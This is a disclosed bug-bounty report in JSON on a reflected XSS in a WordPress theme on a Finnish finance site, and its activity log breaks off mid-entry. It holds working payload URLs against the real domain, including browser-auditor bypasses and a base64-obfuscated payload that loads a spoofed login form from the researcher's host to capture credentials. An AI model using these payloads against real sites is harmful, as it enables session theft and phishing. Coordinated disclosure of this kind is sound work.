{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2018-04-09T21:32:45.762Z", 
    "voters": [
        "putsi", 
        "sp1d3rs", 
        "muon4", 
        "eveeez", 
        "whitesector", 
        "m7mdharoun", 
        "japz", 
        "niced4y"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "250.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 324442, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2018-04-09T20:54:09.593Z", 
    "vulnerability_information": "## Basic report information\n**Summary:** \nThe BBE Theme allows unauthorized access to bbe_open_htmleditor_popup.php which echoes unsanitized values of value-GET-parameter leading to reflected XSS. \n\n**Description:** \nThe www.lahitapiolarahoitus.fi has Wordpress with theme BBE Theme v1.52. I did some code review and it seems that a file on the theme contains various problems:\n- The following admin URL can be accessed without being logged in: https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php\n- The above page uses \"value\" GET-parameter and fails to sanitize the content.\n\nBy combining the above problems, an attacker can craft a URL which triggers an cross-site scripting attack on any user (unauthenticated/authenticated) who opens the URL crafted by the attacker.\n\n**Impact:**\n* Make admin-user run malicious javascript which will then be used to access other WP-Admin functionalities --> Remote code execution --> Possibly piivoting to other hosts.\n* Make other users run malicious javascript.\n* Show spoofed content which can be used in social engineering attacks (such as fake login pages, fake invoices, face contact details, fake announcements etc.).\n\n## Browsers / Apps Verified In:\n\n  * Firefox\n\n## Steps To Reproduce:\n\n  1. Navigate to the following URL: ```https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?value=%22a%27);//%3C/script%3E%3Cbody%20onload=alert(document.cookie)%3E``` and notice that the XSS triggered.\n\n## Impact\n\n* Make admin-user run malicious javascript which will then be used to access other WP-Admin functionalities --> Remote code execution --> Possibly piivoting to other hosts.\n* Make other users run malicious javascript.\n* Show spoofed content which can be used in social engineering attacks (such as fake login pages, fake invoices, face contact details, fake announcements etc.).", 
    "activity_page_count": 1, 
    "severity": {
        "metrics": {
            "confidentiality": "high", 
            "privileges_required": "none", 
            "user_interaction": "required", 
            "attack_vector": "network", 
            "attack_complexity": "low", 
            "scope": "unchanged", 
            "integrity": "high", 
            "availability": "high"
        }, 
        "rating": "high", 
        "score": 7.8, 
        "author_type": "User"
    }, 
    "title": "Reflected XSS on bbe_open_htmleditor_popup.php of BBE Theme via \"value\"-GET-parameter", 
    "is_member_of_team?": null, 
    "vote_count": 8, 
    "summaries": [
        {
            "category": "team", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 7065, 
            "content": "##Issue\nThe reporter found a vulnerability in the theme being used for the WP installation. The results was a reflected XSS.\n\n##Fix\n\nThe vulnerable functionality was restricted.\n\n##Reasoning\n\nRunning a system which potentially carries a lot of vulnerable endpoints and bad default settings is always a risk. Moreover, keeping track of potential vulnerabilities in themes is very tedious. Hardening should always be compulsory, but may not always be straightforward. While we do our best to be proactive in running our software securely, we do occasionally hit and miss. In this case, the reporter provided excellent value both from a technical point of view as well as explaining the potential impact. A learning opportunity for the occasional reader - put effort into things that matter to the organization you are reporting to.", 
            "content_html": "<h2 id=\"issue\">Issue</h2>\n\n<p>The reporter found a vulnerability in the theme being used for the WP installation. The results was a reflected XSS.</p>\n\n<h2 id=\"fix\">Fix</h2>\n\n<p>The vulnerable functionality was restricted.</p>\n\n<h2 id=\"reasoning\">Reasoning</h2>\n\n<p>Running a system which potentially carries a lot of vulnerable endpoints and bad default settings is always a risk. Moreover, keeping track of potential vulnerabilities in themes is very tedious. Hardening should always be compulsory, but may not always be straightforward. While we do our best to be proactive in running our software securely, we do occasionally hit and miss. In this case, the reporter provided excellent value both from a technical point of view as well as explaining the potential impact. A learning opportunity for the occasional reader - put effort into things that matter to the organization you are reporting to.</p>\n"
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": {
        "asset_identifier": "www.lahitapiolarahoitus.fi", 
        "max_severity": "high", 
        "databaseId": 6797, 
        "asset_type": "URL"
    }, 
    "allow_singular_disclosure_at": null, 
    "state": "Closed", 
    "cve_ids": [], 
    "activity_page_number": 1, 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$250", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2018-03-11T15:55:02.717Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-11T15:55:23.758Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "If you wish to have a PoC which does remote code execution (Linux shell), please let me know.\nThe basic idea is that if an admin opens the URL given by the attacker, the XSS is executed. As the admin can upload plugins to Wordpress, the attacker can use the XSS to upload a malicious plugin which provides a shell thus gaining RCE.", 
            "markdown_message": "<p>If you wish to have a PoC which does remote code execution (Linux shell), please let me know.<br>\nThe basic idea is that if an admin opens the URL given by the attacker, the XSS is executed. As the admin can upload plugins to Wordpress, the attacker can use the XSS to upload a malicious plugin which provides a shell thus gaining RCE.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2480950, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-11T16:12:04.972Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-11T16:12:04.972Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.\n\nOur security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.\n\n*Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report and http://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/. Also, our policy contains a lot of information on what is relevant and what is not.*", 
            "markdown_message": "<p>Thanks a lot for reporting this potential issue back to us. LocalTapiola takes security very seriously and would appreciate if you would not share any information about this report until we have determined whether this is a bug and what any potential impact (or fix) will be.</p>\n\n<p>Our security team will take a look at this issue as soon as possible. We aim to respond to your report as soon as possible, but due to the complexity of the systems, triaging many times can take a long time. We prioritize issues -  reports containing trivial issues with limited (or no) business impact and badly written reports with insufficient information on how to reproduce the issue receive a lower priority. Please do not request updates for at least 20 days into the process. Once triaged and verified, bounty decisions are made 1-2 times per month.</p>\n\n<p><em>Note: if we frequently dismiss your reports, make sure you have read our policy and stay in scope and that you know how to write good reports - <a title=\"https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" href=\"/redirect?signature=4a5425e8988ac17fee1486083adea42f02a69a52&amp;url=https%3A%2F%2Fsupport.hackerone.com%2Fhc%2Fen-us%2Farticles%2F211538803-Step-by-Step-How-to-write-a-good-vulnerability-report\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://support.hackerone.com/hc/en-us/articles/211538803-Step-by-Step-How-to-write-a-good-vulnerability-report</span><i class=\"icon-external-link\"></i></a> and <a title=\"http://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/\" href=\"/redirect?signature=8c946efce5c7782533f2fcab04119fa1615d6138&amp;url=http%3A%2F%2Fblog.bugcrowd.com%2Fadvice-for-writing-a-great-vulnerability-report%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://blog.bugcrowd.com/advice-for-writing-a-great-vulnerability-report/</span><i class=\"icon-external-link\"></i></a>. Also, our policy contains a lot of information on what is relevant and what is not.</em></p>\n", 
            "type": "Activities::Comment", 
            "id": 2480963, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-11T16:18:47.814Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-11T16:20:32.965Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "I did a quick test using Chrome 64 / Win 10 and IE11 / WIn 10 & 7 and both blocked the XSS from triggering. Firefox 58 on Win 7 (did not test Win 10 here) triggers the XSS.\n\nThis means the issue is there, but is not widely exploitable.\n\nVector: We are targeting an admin who is using Firefox (and of course is logged on for the CSRF to work.)", 
            "markdown_message": "<p>I did a quick test using Chrome 64 / Win 10 and IE11 / WIn 10 &amp; 7 and both blocked the XSS from triggering. Firefox 58 on Win 7 (did not test Win 10 here) triggers the XSS.</p>\n\n<p>This means the issue is there, but is not widely exploitable.</p>\n\n<p>Vector: We are targeting an admin who is using Firefox (and of course is logged on for the CSRF to work.)</p>\n", 
            "type": "Activities::Comment", 
            "id": 2480971, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-11T16:21:09.974Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-11T16:21:09.974Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 2480972, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-11T16:21:31.142Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-11T16:27:52.574Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Hey,\nThat just means that the simple example payload doesn't work on Chrome.\nTomorrow I'll try to do a payload which bypasses Chrome and IE xss auditors. It shouldn't be a huge problem as the page literally doesn't filter anything from the payload.", 
            "markdown_message": "<p>Hey,<br>\nThat just means that the simple example payload doesn&#39;t work on Chrome.<br>\nTomorrow I&#39;ll try to do a payload which bypasses Chrome and IE xss auditors. It shouldn&#39;t be a huge problem as the page literally doesn&#39;t filter anything from the payload.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2480973, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-11T16:30:56.158Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-11T16:30:56.158Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Yes, that would surely show a more serious impact. Thanks.", 
            "markdown_message": "<p>Yes, that would surely show a more serious impact. Thanks.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2480987, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-12T15:11:05.964Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-12T15:18:21.485Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Hola!\n\nAuditor bypass for Chrome 64: \n```\nhttps://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?value=A%27)%3b}%3balert(document.cookie)%3bif(0){var+html%3dwindow.opener.document.querySelector(%27[%3d\"\n```\n\nIE auditor bypass incoming ASAP.", 
            "markdown_message": "<p>Hola!</p>\n\n<p>Auditor bypass for Chrome 64: </p>\n<pre class=\"highlight plaintext\"><code>https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?value=A%27)%3b}%3balert(document.cookie)%3bif(0){var+html%3dwindow.opener.document.querySelector(%27[%3d&quot;\n</code></pre>\n<p>IE auditor bypass incoming ASAP.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2483957, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/271/715/47650b2c760e9d3077e29fa7cdd0571344838e66/xsspoc.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222537Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c3e3a143573bcdba5ecee3df7ceec93c519eb097d78bc917ce05929a31eda665", 
                    "type": "image/png", 
                    "id": 271715, 
                    "filename": "xsspoc.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2018-03-12T15:24:35.943Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-12T15:38:31.742Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Here's a payload which bypasses all auditors and works with **Firefox, IE, Chrome and Edge**:\n\n```\nhttps://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?attribute='</script><body onload&value=alert(document.cookie)\n```\n\n**Fun fact: It seems that the \"attribute\"-parameter is also vulnerable to XSS.**\n\nThe F271715 demonstrates exploitation on Firefox, Chrome, IE and Edge.", 
            "markdown_message": "<p>Here&#39;s a payload which bypasses all auditors and works with <strong>Firefox, IE, Chrome and Edge</strong>:</p>\n<pre class=\"highlight plaintext\"><code>https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?attribute=&#39;&lt;/script&gt;&lt;body onload&amp;value=alert(document.cookie)\n</code></pre>\n<p><strong>Fun fact: It seems that the &quot;attribute&quot;-parameter is also vulnerable to XSS.</strong></p>\n\n<p>The <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"xsspoc.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/271/715/47650b2c760e9d3077e29fa7cdd0571344838e66/xsspoc.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222537Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c3e3a143573bcdba5ecee3df7ceec93c519eb097d78bc917ce05929a31eda665\" data-attachment-type=\"image/png\">xsspoc.png (F271715)</a> demonstrates exploitation on Firefox, Chrome, IE and Edge.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2484024, 
            "genius_execution_id": null
        }, 
        {
            "attachments": [
                {
                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/271/740/a2c4f38decae19c0439c0717f8e15b71081b2505/login.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T222537Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c1e73c02a85708904065616cc112026181eb1fffabcf066fb0dc832164c85a40", 
                    "type": "image/png", 
                    "id": 271740, 
                    "filename": "login.png"
                }
            ], 
            "automated_response": false, 
            "created_at": "2018-03-12T16:45:54.705Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-12T16:58:45.295Z", 
            "actor": {
                "username": "putsi", 
                "url": "/putsi", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/044/111/a49e6af6c29aa221dfeeb8efb4863c57cacc5337_medium.png?1505158469"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "As for the attack scenarios, I'd consider the following ones most potential:\n- Make the admin run the XSS and use the XSS to install custom WP-plugin which results in remote OS command execution. Then use this RCE to serve malicious content on domain and scan possible internal hosts etc.\n- Make the users of myynti.lahitapiolarahoitus.fi leak their credentials via some social engineering. See the URL [1] and F271740 for example. In this example attack, the malicious URL loads an iframe from my website which looks exactly like the login-form of [myynti.lahitapiolarahoitus.fi](myynti.lahitapiolarahoitus.fi). When the form is used, it will post user's credentials to my server.\n- Show spoofed content to anonymous users. I don't have any fancy ideas on what to show but maybe something that would hurt the Localtapiola brand or maybe phish some confidential information from the customer. Then deliver the URLs via mass-emailing or via snail-mail.\n\n\n[1] Login-page spoofing:\n\n```\nhttps://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?attribute='</script><body onload&value=eval(atob('ST1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTtJLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cHM6Ly9wdXRzaS5yb3QuZmkvcmFob2l0dXMnKTtJLnN0eWxlLndpZHRoPScxMDAlJztJLnN0eWxlLmhlaWdodD0nODAwcHgnO0kuc3R5bGUuYm9yZGVyPTA7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChJKTs='))\n```", 
            "markdown_message": "<p>As for the attack scenarios, I&#39;d consider the following ones most potential:</p>\n\n<ul>\n<li>Make the admin run the XSS and use the XSS to install custom WP-plugin which results in remote OS command execution. Then use this RCE to serve malicious content on domain and scan possible internal hosts etc.</li>\n<li>Make the users of myynti.lahitapiolarahoitus.fi leak their credentials via some social engineering. See the URL [1] and <a href=\"#\" class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"login.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/271/740/a2c4f38decae19c0439c0717f8e15b71081b2505/login.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ5B43OTPE%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T222537Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDCiDARkX3ArKGaO7%2ByK3A39tqjzyooRkX4qPdNM7MkAemep3r5%2Fh%2B11ZdH6KbZ8q2cgU%2FRMODKRq75fJ6sn%2FkR1fBrPaMFfKsP%2BSLpkSrkbyi968FqbmO6yo59Heb3d1kDMwzaNShj3ou%2Fq9qAc5NWgXlxJtABJqkgxPd5NovxMOsASin8kfBjU8OhOOEnonvd2t16oF509MVoA81P%2Frmr4njIb3UfHzYyccuDQNjHM0qV7B57bCKQeIuO%2FzLl7au%2FWR2v6R6bwK6fGUYVbcnAam9GqobWJnMl6NFbipNSdmUzB5%2BglRYaYeGXxbgxseM7SSFeehfzbywUoHEf4Ve61V1e90uyx3M0Krbm5QjS5gNgwErj0g2rC2mkrl2q%2B9ADfOzgMAX8fUODFalEv4gZf0ZKuLhpmAzEapJE5f%2BarcSkdn5b0ddy4Wa2vdsZ6lQ5NOez8qkcnaBEJZLnv3YGHyInLrIaUkqlq4iavZpr4f5Al5PueqIzLuItn5ztJjfvCu5dDIplWP0eo6r%2BIUCKsDwUNkRSgWCtJbCfl%2BPF3PKHjvnmVEBawLZlpXvaOGUvA%2FKYb2cGGXn89CPjYlwpWCj2J8Z%2B0okbim4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=c1e73c02a85708904065616cc112026181eb1fffabcf066fb0dc832164c85a40\" data-attachment-type=\"image/png\">login.png (F271740)</a> for example. In this example attack, the malicious URL loads an iframe from my website which looks exactly like the login-form of <a href=\"/redirect?signature=cbe73fce568d2bbe42c6f706035cd187b6ac2694&amp;url=http%3A%2F%2Fmyynti.lahitapiolarahoitus.fi\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>myynti.lahitapiolarahoitus.fi</span><i class=\"icon-external-link\"></i></a>. When the form is used, it will post user&#39;s credentials to my server.</li>\n<li>Show spoofed content to anonymous users. I don&#39;t have any fancy ideas on what to show but maybe something that would hurt the Localtapiola brand or maybe phish some confidential information from the customer. Then deliver the URLs via mass-emailing or via snail-mail.</li>\n</ul>\n\n<p>[1] Login-page spoofing:</p>\n<pre class=\"highlight plaintext\"><code>https://www.lahitapiolarahoitus.fi/wp-content/themes/bbe/bbe-engine/assets/actions/bbe_open_htmleditor_popup.php?attribute=&#39;&lt;/script&gt;&lt;body onload&amp;value=eval(atob(&#39;ST1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpZnJhbWUnKTtJLnNldEF0dHJpYnV0ZSgnc3JjJywnaHR0cHM6Ly9wdXRzaS5yb3QuZmkvcmFob2l0dXMnKTtJLnN0eWxlLndpZHRoPScxMDAlJztJLnN0eWxlLmhlaWdodD0nODAwcHgnO0kuc3R5bGUuYm9yZGVyPTA7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChJKTs=&#39;))\n</code></pre>", 
            "type": "Activities::Comment", 
            "id": 2484601, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-12T20:21:20.680Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-12T20:21:20.680Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "Great, good work.", 
            "markdown_message": "<p>Great, good work.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2485375, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-15T09:10:17.774Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-15T09:10:17.774Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "FYI: We have opened a ticket to the service provider on this report.", 
            "markdown_message": "<p>FYI: We have opened a ticket to the service provider on this report.</p>\n", 
            "type": "Activities::Comment", 
            "id": 2494509, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2018-03-16T21:30:41.632Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2018-03-16T21:30:41.632Z", 
            "actor": {
                "username": "localtapiola-thomas", 
                "url": "/localtapiola-thomas", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/060/017/631ceafd5b502a492e39ff6a10b5486da480bff2_medium.png?1457533770"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "localtapiola", 
            "message": "@putsi have a look if you can still reproduce this (or circumvent). Looking forward to your comments.", 
